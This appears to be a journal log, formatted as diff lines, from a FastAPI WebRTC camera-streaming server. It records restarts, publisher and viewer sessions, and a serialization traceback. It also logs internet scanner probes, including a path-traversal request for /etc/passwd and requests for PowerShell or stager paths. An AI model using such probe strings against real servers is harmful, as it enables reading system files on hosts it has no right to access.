+Oct 21 15:34:18 ip-172-31-41-158 python3[1831]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 21 15:40:31 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:40634 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 15:51:05 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:37058 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 15:51:41 ip-172-31-41-158 python3[1831]: INFO:     5.187.35.54:34164 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+Oct 21 16:11:29 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:24426 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 16:29:50 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 21 16:29:50 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 21 17:49:59 ip-172-31-41-158 python3[1831]: INFO:     192.241.131.26:38978 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 17:49:59 ip-172-31-41-158 python3[1831]: INFO:     192.241.131.26:38980 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+Oct 21 17:56:33 ip-172-31-41-158 python3[1831]: INFO:     87.121.84.14:55164 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+Oct 21 17:58:00 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:57394 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 18:54:11 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:30336 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 19:23:57 ip-172-31-41-158 python3[1831]: INFO:     94.156.152.38:39516 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 19:25:59 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.30:37312 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 19:27:01 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:45844 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 19:51:50 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:38784 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 21:34:02 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:1620 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 21:36:02 ip-172-31-41-158 python3[1831]: INFO:     44.212.1.106:42508 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 21:59:21 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:34824 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 22:48:15 ip-172-31-41-158 python3[1831]: INFO:     109.105.210.100:50739 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 23:16:04 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:48582 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 23:53:05 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:44356 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 01:08:34 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:58836 - "GET /login HTTP/1.1" 404 Not Found
+Oct 22 01:53:41 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:38188 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 01:59:56 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:30:41 ip-172-31-41-158 python3[1831]: INFO:     45.84.139.37:49690 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 02:33:49 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:50 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:50 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:51 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:51 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:52 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:52 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:53 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:53 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:54 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:54 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:33:55 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 02:44:49 ip-172-31-41-158 python3[1831]: INFO:     176.65.149.157:52718 - "GET /login HTTP/1.1" 404 Not Found
+Oct 22 03:00:13 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 03:01:15 ip-172-31-41-158 python3[1831]: INFO:     3.132.23.201:45454 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 03:03:50 ip-172-31-41-158 python3[1831]: INFO:     3.132.23.201:46920 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 03:05:06 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 03:08:38 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 03:59:16 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:36202 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 05:55:34 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:53990 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 06:24:31 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 06:24:32 ip-172-31-41-158 python3[1831]: WARNING:  Invalid HTTP request received.
+Oct 22 06:24:32 ip-172-31-41-158 python3[1831]: INFO:     157.245.2.231:45970 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 06:24:33 ip-172-31-41-158 python3[1831]: INFO:     157.245.2.231:45980 - "GET /download/powershell/ HTTP/1.1" 404 Not Found
+Oct 22 06:24:33 ip-172-31-41-158 python3[1831]: INFO:     157.245.2.231:45982 - "GET /get.php HTTP/1.1" 404 Not Found
+Oct 22 08:05:42 ip-172-31-41-158 python3[1831]: INFO:     204.76.203.219:40698 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 09:35:46 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 09:35:46 ip-172-31-41-158 python3[1831]: INFO:     Shutting down
+Oct 22 09:35:46 ip-172-31-41-158 python3[1831]: INFO:     Waiting for application shutdown.
+Oct 22 09:35:46 ip-172-31-41-158 python3[1831]: INFO:     Application shutdown complete.
+Oct 22 09:35:46 ip-172-31-41-158 python3[1831]: INFO:     Finished server process [1831]
+Oct 22 09:35:46 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 09:35:46 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 09:35:46 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 2min 18.709s CPU time.
+Oct 22 09:35:46 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 09:35:47 ip-172-31-41-158 python3[4835]: INFO:     Started server process [4835]
+Oct 22 09:35:47 ip-172-31-41-158 python3[4835]: INFO:     Waiting for application startup.
+Oct 22 09:35:47 ip-172-31-41-158 python3[4835]: INFO:     Application startup complete.
+Oct 22 09:35:47 ip-172-31-41-158 python3[4835]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 09:36:31 ip-172-31-41-158 python3[4835]: /publish: Access to cam01
+Oct 22 09:36:31 ip-172-31-41-158 python3[4835]: Receive Publisher Track: cam01, kind=video
+Oct 22 09:36:31 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:64885 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 09:37:27 ip-172-31-41-158 python3[4835]: publisher[cam01] state: connecting
+Oct 22 09:37:27 ip-172-31-41-158 python3[4835]: publisher[cam01] state: connected
+Oct 22 09:37:27 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:49876 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 22 09:37:27 ip-172-31-41-158 python3[4835]: /viewer: target=cam01
+Oct 22 09:37:27 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:49876 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:37:37 ip-172-31-41-158 python3[4835]: viewer state: connecting
+Oct 22 09:37:37 ip-172-31-41-158 python3[4835]: viewer state: connected
+Oct 22 09:37:37 ip-172-31-41-158 python3[4835]: viewer state: closed
+Oct 22 09:37:37 ip-172-31-41-158 python3[4835]: /viewer: target=cam01
+Oct 22 09:37:37 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:49879 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: viewer state: connecting
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: viewer state: connected
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: viewer state: closed
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: End Publisher Video: cam01
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: publisher[cam01] state: closed
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: /publish: Access to cam01
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: Receive Publisher Track: cam01, kind=video
+Oct 22 09:38:38 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:64910 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 09:38:49 ip-172-31-41-158 python3[4835]: publisher[cam01] state: connecting
+Oct 22 09:38:49 ip-172-31-41-158 python3[4835]: publisher[cam01] state: connected
+Oct 22 09:38:49 ip-172-31-41-158 python3[4835]: /viewer: target=cam01
+Oct 22 09:38:49 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:50054 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:39:10 ip-172-31-41-158 python3[4835]: viewer state: connecting
+Oct 22 09:39:10 ip-172-31-41-158 python3[4835]: viewer state: connected
+Oct 22 09:39:10 ip-172-31-41-158 python3[4835]: viewer state: closed
+Oct 22 09:39:10 ip-172-31-41-158 python3[4835]: /viewer: target=cam01
+Oct 22 09:39:10 ip-172-31-41-158 python3[4835]: INFO:     121.141.19.79:50138 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:42:45 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 09:42:46 ip-172-31-41-158 python3[4835]: INFO:     Shutting down
+Oct 22 09:42:46 ip-172-31-41-158 python3[4835]: INFO:     Waiting for application shutdown.
+Oct 22 09:42:46 ip-172-31-41-158 python3[4835]: INFO:     Application shutdown complete.
+Oct 22 09:42:46 ip-172-31-41-158 python3[4835]: INFO:     Finished server process [4835]
+Oct 22 09:42:46 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 09:42:46 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 09:42:46 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 1min 52.178s CPU time.
+Oct 22 09:42:46 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 09:42:47 ip-172-31-41-158 python3[4899]: INFO:     Started server process [4899]
+Oct 22 09:42:47 ip-172-31-41-158 python3[4899]: INFO:     Waiting for application startup.
+Oct 22 09:42:47 ip-172-31-41-158 python3[4899]: INFO:     Application startup complete.
+Oct 22 09:42:47 ip-172-31-41-158 python3[4899]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 09:44:25 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 09:44:25 ip-172-31-41-158 python3[4899]: INFO:     Shutting down
+Oct 22 09:44:25 ip-172-31-41-158 python3[4899]: INFO:     Waiting for application shutdown.
+Oct 22 09:44:25 ip-172-31-41-158 python3[4899]: INFO:     Application shutdown complete.
+Oct 22 09:44:25 ip-172-31-41-158 python3[4899]: INFO:     Finished server process [4899]
+Oct 22 09:44:25 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 09:44:25 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 09:44:25 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 09:44:26 ip-172-31-41-158 python3[4942]: INFO:     Started server process [4942]
+Oct 22 09:44:26 ip-172-31-41-158 python3[4942]: INFO:     Waiting for application startup.
+Oct 22 09:44:26 ip-172-31-41-158 python3[4942]: INFO:     Application startup complete.
+Oct 22 09:44:26 ip-172-31-41-158 python3[4942]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 09:44:36 ip-172-31-41-158 python3[4942]: /publish: Access to cam01
+Oct 22 09:44:36 ip-172-31-41-158 python3[4942]: Receive Publisher Track: cam01, kind=video
+Oct 22 09:44:36 ip-172-31-41-158 python3[4942]: INFO:     121.141.19.79:65033 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 09:44:43 ip-172-31-41-158 python3[4942]: publisher[cam01] state: connecting
+Oct 22 09:44:43 ip-172-31-41-158 python3[4942]: publisher[cam01] state: connected
+Oct 22 09:44:43 ip-172-31-41-158 python3[4942]: /viewer: target=cam01
+Oct 22 09:44:43 ip-172-31-41-158 python3[4942]: INFO:     121.141.19.79:51500 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:44:57 ip-172-31-41-158 python3[4942]: viewer state: connecting
+Oct 22 09:44:57 ip-172-31-41-158 python3[4942]: viewer state: connected
+Oct 22 09:44:57 ip-172-31-41-158 python3[4942]: viewer state: closed
+Oct 22 09:44:57 ip-172-31-41-158 python3[4942]: /viewer: target=cam01
+Oct 22 09:44:57 ip-172-31-41-158 python3[4942]: INFO:     121.141.19.79:51558 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:45:19 ip-172-31-41-158 python3[4942]: viewer state: connecting
+Oct 22 09:45:19 ip-172-31-41-158 python3[4942]: viewer state: connected
+Oct 22 09:45:19 ip-172-31-41-158 python3[4942]: INFO:     176.65.149.30:52234 - "GET /login HTTP/1.1" 404 Not Found
+Oct 22 09:48:09 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 09:48:09 ip-172-31-41-158 python3[4942]: INFO:     Shutting down
+Oct 22 09:48:09 ip-172-31-41-158 python3[4942]: INFO:     Waiting for application shutdown.
+Oct 22 09:48:09 ip-172-31-41-158 python3[4942]: INFO:     Application shutdown complete.
+Oct 22 09:48:09 ip-172-31-41-158 python3[4942]: INFO:     Finished server process [4942]
+Oct 22 09:48:09 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 09:48:09 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 09:48:09 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 59.798s CPU time.
+Oct 22 09:48:09 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 09:48:10 ip-172-31-41-158 python3[4991]: INFO:     Started server process [4991]
+Oct 22 09:48:10 ip-172-31-41-158 python3[4991]: INFO:     Waiting for application startup.
+Oct 22 09:48:10 ip-172-31-41-158 python3[4991]: INFO:     Application startup complete.
+Oct 22 09:48:10 ip-172-31-41-158 python3[4991]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 09:48:20 ip-172-31-41-158 python3[4991]: /publish: Access to cam01
+Oct 22 09:48:20 ip-172-31-41-158 python3[4991]: Receive Publisher Track: cam01, kind=video
+Oct 22 09:48:20 ip-172-31-41-158 python3[4991]: INFO:     121.141.19.79:65058 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 09:48:39 ip-172-31-41-158 python3[4991]: publisher[cam01] state: connecting
+Oct 22 09:48:39 ip-172-31-41-158 python3[4991]: publisher[cam01] state: connected
+Oct 22 09:48:39 ip-172-31-41-158 python3[4991]: INFO:     121.141.19.79:52473 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 22 09:48:39 ip-172-31-41-158 python3[4991]: /viewer: target=cam01
+Oct 22 09:48:39 ip-172-31-41-158 python3[4991]: INFO:     121.141.19.79:52473 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: [09:48:39.354520] viewer state: connecting
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: [09:48:39.607745] viewer state: connected
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: [09:48:58.342732] viewer state: closed
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: End Publisher Video: cam01
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: publisher[cam01] state: closed
+Oct 22 09:56:22 ip-172-31-41-158 python3[4991]: INFO:     204.76.203.219:49832 - "GET / HTTP/1.1" 404 Not Found
+Oct 22 09:56:28 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 09:56:28 ip-172-31-41-158 python3[4991]: INFO:     Shutting down
+Oct 22 09:56:28 ip-172-31-41-158 python3[4991]: INFO:     Waiting for application shutdown.
+Oct 22 09:56:28 ip-172-31-41-158 python3[4991]: INFO:     Application shutdown complete.
+Oct 22 09:56:28 ip-172-31-41-158 python3[4991]: INFO:     Finished server process [4991]
+Oct 22 09:56:28 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 09:56:28 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 09:56:28 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 1min 25.590s CPU time.
+Oct 22 09:56:28 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 09:56:29 ip-172-31-41-158 python3[5148]: INFO:     Started server process [5148]
+Oct 22 09:56:29 ip-172-31-41-158 python3[5148]: INFO:     Waiting for application startup.
+Oct 22 09:56:29 ip-172-31-41-158 python3[5148]: INFO:     Application startup complete.
+Oct 22 09:56:29 ip-172-31-41-158 python3[5148]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 09:59:19 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55130 - "GET /viewer_pcs HTTP/1.1" 404 Not Found
+Oct 22 09:59:35 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55199 - "GET /viewser_pcs HTTP/1.1" 200 OK
+Oct 22 09:59:44 ip-172-31-41-158 python3[5148]: /publish: Access to cam01
+Oct 22 09:59:44 ip-172-31-41-158 python3[5148]: Receive Publisher Track: cam01, kind=video
+Oct 22 09:59:44 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:65117 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 09:59:46 ip-172-31-41-158 python3[5148]: publisher[cam01] state: connecting
+Oct 22 09:59:46 ip-172-31-41-158 python3[5148]: publisher[cam01] state: connected
+Oct 22 09:59:46 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55249 - "GET /viewser_pcs HTTP/1.1" 200 OK
+Oct 22 09:59:47 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55249 - "GET /viewser_pcs HTTP/1.1" 200 OK
+Oct 22 09:59:51 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55274 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 22 09:59:51 ip-172-31-41-158 python3[5148]: /viewer: target=cam01
+Oct 22 09:59:51 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55274 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: [09:59:51.828804] viewer state: connecting
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: [09:59:52.296648] viewer state: connected
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: INFO:     121.141.19.79:55318 - "GET /viewser_pcs HTTP/1.1" 500 Internal Server Error
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: ERROR:    Exception in ASGI application
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: Traceback (most recent call last):
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/uvicorn/protocols/http/h11_impl.py", line 403, in run_asgi
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     result = await app(  # type: ignore[func-returns-value]
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/uvicorn/middleware/proxy_headers.py", line 60, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     return await self.app(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/applications.py", line 1133, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await super().__call__(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/applications.py", line 113, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.middleware_stack(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/errors.py", line 186, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     raise exc
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/errors.py", line 164, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.app(scope, receive, _send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/cors.py", line 85, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.app(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/middleware/exceptions.py", line 63, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     raise exc
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await app(scope, receive, sender)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/middleware/asyncexitstack.py", line 18, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.app(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 716, in __call__
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.middleware_stack(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 736, in app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await route.handle(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/routing.py", line 290, in handle
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await self.app(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 123, in app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     raise exc
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     await app(scope, receive, sender)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 109, in app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     response = await f(request)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 411, in app
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     content = await serialize_response(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/routing.py", line 277, in serialize_response
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     return jsonable_encoder(response_content)
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     encoded_value = jsonable_encoder(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 311, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     jsonable_encoder(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 341, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     return jsonable_encoder(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     encoded_value = jsonable_encoder(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 297, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     encoded_value = jsonable_encoder(
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:   File "/home/ubuntu/.local/lib/python3.10/site-packages/fastapi/encoders.py", line 305, in jsonable_encoder
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]:     encoded_dict[encoded_key] = encoded_value
+Oct 22 10:00:01 ip-172-31-41-158 python3[5148]: TypeError: unhashable type: 'dict'
+Oct 22 10:01:56 ip-172-31-41-158 python3[5148]: WARNING:  Invalid HTTP request received.
+Oct 22 10:01:57 ip-172-31-41-158 python3[5148]: WARNING:  Invalid HTTP request received.
+Oct 22 10:02:00 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 22 10:02:00 ip-172-31-41-158 python3[5148]: INFO:     Shutting down
+Oct 22 10:02:00 ip-172-31-41-158 python3[5148]: INFO:     Waiting for application shutdown.
+Oct 22 10:02:00 ip-172-31-41-158 python3[5148]: INFO:     Application shutdown complete.
+Oct 22 10:02:00 ip-172-31-41-158 python3[5148]: INFO:     Finished server process [5148]
+Oct 22 10:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 22 10:02:00 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 22 10:02:00 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 1min 25.091s CPU time.
+Oct 22 10:02:00 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 22 10:02:01 ip-172-31-41-158 python3[5206]: INFO:     Started server process [5206]
+Oct 22 10:02:01 ip-172-31-41-158 python3[5206]: INFO:     Waiting for application startup.
+Oct 22 10:02:01 ip-172-31-41-158 python3[5206]: INFO:     Application startup complete.
+Oct 22 10:02:01 ip-172-31-41-158 python3[5206]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 22 10:04:11 ip-172-31-41-158 python3[5206]: /publish: Access to cam01
+Oct 22 10:04:11 ip-172-31-41-158 python3[5206]: Receive Publisher Track: cam01, kind=video
+Oct 22 10:04:11 ip-172-31-41-158 python3[5206]: INFO:     121.141.19.79:65139 - "POST /publish HTTP/1.1" 200 OK
+Oct 22 10:04:16 ip-172-31-41-158 python3[5206]: publisher[cam01] state: connecting
+Oct 22 10:04:16 ip-172-31-41-158 python3[5206]: publisher[cam01] state: connected
+Oct 22 10:04:16 ip-172-31-41-158 python3[5206]: /viewer: target=cam01
+Oct 22 10:04:16 ip-172-31-41-158 python3[5206]: INFO:     121.141.19.79:56366 - "POST /viewer HTTP/1.1" 200 OK
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: [10:04:16.463284] viewer state: connecting
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: [10:04:16.685778] viewer state: connected
+Oct 22 10:04:19 ip-172-31-41-158 python3[5206]: INFO:     121.141.19.79:40196 - "GET /viewser_pcs HTTP/1.1" 500 Internal Server Error
